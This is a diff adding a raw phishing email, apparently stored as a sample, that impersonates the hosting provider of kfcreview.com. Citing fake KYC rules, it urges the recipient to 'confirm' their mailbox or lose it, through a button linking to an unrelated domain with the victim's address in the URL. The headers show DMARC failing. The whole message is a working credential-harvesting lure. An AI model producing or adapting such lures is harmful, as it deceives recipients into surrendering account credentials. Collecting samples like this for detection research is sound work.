@@ -1,0 +1,126 @@
+Return-Path: <no-reply@kfcreview.com>
+Received: from kfcreview.com ([86.54.42.197])
+ by inbound-smtp.us-east-2.amazonaws.com with SMTP id 12312drevu51ghgm3u6o5mb89el0qr8rmiu207g1
+ for info@kfcreview.com;
+ Sat, 24 Jan 2026 11:22:28 +0000 (UTC)
+Received-SPF: none (spfCheck: 86.54.42.197 is neither permitted nor denied by domain of kfcreview.com) client-ip=86.54.42.197; envelope-from=no-reply@kfcreview.com; helo=kfcreview.com;
+Authentication-Results: amazonses.com;
+ spf=none (spfCheck: 86.54.42.197 is neither permitted nor denied by domain of kfcreview.com) client-ip=86.54.42.197; envelope-from=no-reply@kfcreview.com; helo=kfcreview.com;
+ dmarc=fail header.from=kfcreview.com;
+X-SES-RECEIPT: AEFBQUFBQUFBQUFFMllJZ1VFUkJITDhnTGZVQkRFcFg2cFNoeUtkQ0F4aVo3ZEdJbXBzT0JkTXlLZFN3YjBvRURyQnhtd0N4c05QK0x5Nzg1aHIrYk9scjdPcUJ5KzNvT0tad09PYnh4TnNYQnBLNjhNVU5sMzN4bGdFcFBuTmw0NGN3OVYzQXpucjRBVzN0OEhOQlNHaDYxNTZXbnBIZjQwZm9hb1BRdGJhYjQ0NWxKRWs4VzJzck9nSUxxdUV5L3ZIWmhuUzkwUHBrUlJQSGpxTzF4bGJTM1p5YVJyTlZSa3JtOERvMnc2VW1nNFZwL3lIeXhPTVowQ1BWbDF4OWM5K0JtbzMxcHVWZER3QUd2UlRRWEVwSDRkS2Zkc2lpMkxQcTNzV0hJbzZBV2hzNEIzakV1UVZBVVk0VzUvck1HQitGRlJhd0RvdXc9
+X-SES-DKIM-SIGNATURE: a=rsa-sha256; q=dns/txt; b=XikVm+6SkLsSrRJESmKLO2MqUxuT7etNOWDAB8qne9eiXhyANtfFwkqhC5su4rKf8iczEQgKIX9qRWgjycW+cp65UjqbJFB3ylGRKgCUM8M5SPz0hyJ6NzzIXhRIXA77jzGrwK0RnE1gOmbYdxb8WR+aoPlOMv2IaciYJukZ9bM=; c=relaxed/simple; s=ndjes4mrtuzus6qxu3frw3ubo3gpjndv; d=amazonses.com; t=1769253748; v=1; bh=z8UvzSLfNRgd6IqT45xxgK4a/WuZcN21l0YyQR9SJLk=; h=From:To:Cc:Bcc:Subject:Date:Message-ID:MIME-Version:Content-Type:X-SES-RECEIPT;
+From: kfcreview.com Hosting provider <no-reply@kfcreview.com>
+To: info@kfcreview.com
+Subject: Deactivation info@kfcreview.com
+Date: 24 Jan 2026 12:22:27 +0100
+Message-ID: <20260124122227.18DF0E0BC4336416@kfcreview.com>
+MIME-Version: 1.0
+Content-Type: text/html;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.=
+w3.org/TR/html4/loose.dtd">
+
+<html>
+
+<head>
+<meta http-equiv=3D"Content-Type" content=3D"text/html; charset=3Dwindows-1=
+252">
+<title>New Page 1</title>
+</head>
+
+<body>
+
+<div class=3D"v1moz-text-html" lang=3D"x-unicode">
+	<table class=3D"v1v1w590" style=3D"border-collapse: collapse; box-sizing: =
+border-box" width=3D"590" cellspacing=3D"0" cellpadding=3D"0" border=3D"0" =
+id=3D"table1">
+		<tbody style=3D"box-sizing: border-box">
+			<tr style=3D"border-collapse: collapse; box-sizing: border-box">
+				<td class=3D"v1v1w590" style=3D"border-collapse: collapse; box-sizing: =
+border-box" width=3D"590">
+				<div style=3D"padding: 10px; text-align: center; font-size: 24px; box-s=
+izing: border-box">
+					<a style=3D"color: rgb(0, 172, 255); text-decoration: none; display: i=
+nline-block; box-sizing: border-box; background-color: transparent" rel=3D"=
+noreferrer" target=3D"_blank" href=3D"https://outlook.live.com/">
+					<img style=3D"border-width: 0px; padding: 0px; width: 95px; height: 85=
+px; text-align: left; text-decoration: none; vertical-align: middle; displa=
+y: block; max-width: 185px; box-sizing: border-box" src=3D"https://www.free=
+pnglogos.com/uploads/email-png/blue-email-box-circle-png-transparent-icon-2=
+=2Epng" width=3D"110" height=3D"107"></a><br style=3D"line-height: 24px; bo=
+x-sizing: border-box">
+					&nbsp;&nbsp;&nbsp; Please confirm your email account with&nbsp;kfcrevi=
+ew.com</div>
+				</td>
+			</tr>
+			<tr style=3D"text-align: center; line-height: normal; border-collapse: c=
+ollapse; box-sizing: border-box">
+				<td style=3D"border-collapse: collapse; box-sizing: border-box">
+				<font style=3D"box-sizing: border-box" color=3D"#0000ff">
+				<hr style=3D"border: 1px solid currentColor; border-image: none; height=
+: 0px; overflow: visible; box-sizing: content-box">
+				</font></td>
+			</tr>
+	</table>
+	<div class=3D"v1v1spacer" style=3D"line-height: 15px; font-size: 15px; box=
+-sizing: border-box">
+		<br>
+&nbsp;</div>
+	<table class=3D"v1v1w590" style=3D"border-collapse: collapse; box-sizing: =
+border-box" width=3D"590" cellspacing=3D"0" cellpadding=3D"0" border=3D"0" =
+id=3D"table2">
+		<tbody style=3D"box-sizing: border-box">
+			<tr style=3D"border-collapse: collapse; box-sizing: border-box">
+				<td class=3D"v1v1w590" style=3D"border-collapse: collapse; box-sizing: =
+border-box" width=3D"590">
+				<div style=3D"text-align: center; line-height: 20px; padding-top: 20px;=
+ font-family: Roboto-Regular, Helvetica, Arial, sans-serif; font-size: 14px=
+; box-sizing: border-box" align=3D"left">
+					Hello info@kfcreview.com<br style=3D"line-height: 14px; box-sizing: bo=
+rder-box">
+					Due to the latest regulations concerning online safety and=20
+					KYC<br style=3D"line-height: 14px; box-sizing: border-box">
+					procedure (&nbsp;
+					<strong style=3D"font-weight: bolder; box-sizing: border-box">
+					Know your Customer</strong> &nbsp;), we are sending this urgent=20
+					notice to all<br style=3D"line-height: 14px; box-sizing: border-box">
+					Email Administrator users, in order to filter non-active users and=20
+					active accounts.</div>
+				<div style=3D"text-align: center; line-height: 20px; padding-top: 20px;=
+ font-family: Roboto-Regular, Helvetica, Arial, sans-serif; font-size: 14px=
+; box-sizing: border-box">
+					In order to avoid your&nbsp;
+					<font style=3D"box-sizing: border-box" color=3D"#0000ff">
+					<u style=3D"box-sizing: border-box"> info@kfcreview.com</u></font>&nbs=
+p;address=20
+					from being closed,<br style=3D"line-height: 14px; box-sizing: border-b=
+ox">
+					please confirm you are still using your account:<br>
+					<br>
+&nbsp;<a target=3D"_blank" rel=3D"noreferrer" href=3D"https://yogisandyogin=
+is.com/zpwll.html#info@kfcreview.com"><span class=3D"v1v1button" style=3D"p=
+adding: 10px 24px; border-radius: 5px; width: 275px; height: 38px; color: r=
+gb(255, 255, 255); line-height: 16px; font-family: &quot;Google Sans&quot;,=
+ Roboto, RobotoDraft, Helvetica, Arial, sans-serif; font-size: 14px; font-w=
+eight: 400; text-decoration: none; display: inline-block; cursor: pointer; =
+min-width: 90px; box-sizing: border-box; background-color: rgb(65, 132, 243=
+); user-select: all"><div align=3D"left">
+						<font style=3D"box-sizing: border-box" size=3D"3">
+						<strong style=3D"font-weight: bolder; box-sizing: border-box">
+						&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+						Confirm&nbsp;email account</strong></font></div>
+					</span></a>
+					<br style=3D"line-height: 14px; box-sizing: border-box">
+&nbsp;<br>
+&nbsp;kfcreview.com&nbsp; Hosting provider</div>
+				</td>
+			</tr>
+	</table>
+	<br style=3D"line-height: 14px; box-sizing: border-box">
+&nbsp;</div>
+
+</body>
+
+</html>
